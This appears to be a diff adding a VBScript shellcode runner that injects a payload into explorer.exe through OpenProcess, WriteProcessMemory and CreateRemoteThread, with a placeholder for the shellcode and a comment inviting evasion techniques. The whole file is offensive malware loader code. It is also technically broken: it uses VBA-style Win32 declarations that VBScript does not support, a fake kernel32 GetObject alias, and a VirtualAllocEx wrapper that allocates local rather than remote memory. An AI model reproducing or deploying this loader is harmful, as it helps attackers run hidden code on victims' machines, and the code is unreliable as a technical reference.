@@ -1,0 +1,107 @@
+' VBS Shellcode Runner using CreateRemoteThread technique
+Option Explicit
+
+' Win32 API Declarations
+Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
+Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
+Private Declare Function RtlMoveMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long) As Long
+Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByRef lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
+Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
+Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+Private Declare Function GetObject Lib "kernel32" Alias "GetObject" (ByVal lpszPathName As String, ByVal cbBuffer As Long, ByRef lpBuffer As Any) As Long
+
+' Constants
+Const MEM_COMMIT = &H1000
+Const MEM_RESERVE = &H2000
+Const PAGE_EXECUTE_READWRITE = &H40
+Const PROCESS_ALL_ACCESS = &H1F0FFF
+
+Sub Main()
+    ' Evasion techniques could be added here
+    
+    ' Shellcode - Replace with actual shellcode
+    Dim buf
+    buf = ####SHELLCODE####
+    
+    ' Target process name
+    Dim targetProcess
+    targetProcess = "explorer.exe"
+    
+    ' Get target process ID
+    Dim pid
+    pid = GetProcessId(targetProcess)
+    
+    If pid = 0 Then
+        WScript.Echo "Failed to find target process"
+        WScript.Quit
+    End If
+    
+    ' Open handle to target process
+    Dim hProcess
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+    
+    If hProcess = 0 Then
+        WScript.Echo "Failed to open process"
+        WScript.Quit
+    End If
+    
+    ' Allocate memory in target process
+    Dim remoteMemory
+    remoteMemory = VirtualAllocEx(hProcess, 0, UBound(buf) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    
+    If remoteMemory = 0 Then
+        WScript.Echo "Failed to allocate memory in target process"
+        CloseHandle hProcess
+        WScript.Quit
+    End If
+    
+    ' Write shellcode to target process memory
+    Dim bytesWritten
+    Dim result
+    result = WriteProcessMemory(hProcess, remoteMemory, buf, UBound(buf) + 1, bytesWritten)
+    
+    If result = 0 Then
+        WScript.Echo "Failed to write to process memory"
+        CloseHandle hProcess
+        WScript.Quit
+    End If
+    
+    ' Create remote thread to execute shellcode
+    Dim hThread
+    hThread = CreateRemoteThread(hProcess, 0, 0, remoteMemory, 0, 0, 0)
+    
+    If hThread = 0 Then
+        WScript.Echo "Failed to create remote thread"
+        CloseHandle hProcess
+        WScript.Quit
+    End If
+    
+    ' Clean up
+    CloseHandle hThread
+    CloseHandle hProcess
+End Sub
+
+Function GetProcessId(processName)
+    Dim objWMIService, colProcesses, objProcess
+    
+    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
+    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")
+    
+    For Each objProcess In colProcesses
+        GetProcessId = objProcess.ProcessId
+        Exit Function
+    Next
+    
+    GetProcessId = 0
+End Function
+
+Function VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
+    ' This is a wrapper for VirtualAllocEx which isn't directly available in VBS
+    ' In a real implementation, you would need to use alternative methods or a COM object
+    VirtualAllocEx = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
+End Function
+
+' Execute the main subroutine
+Main
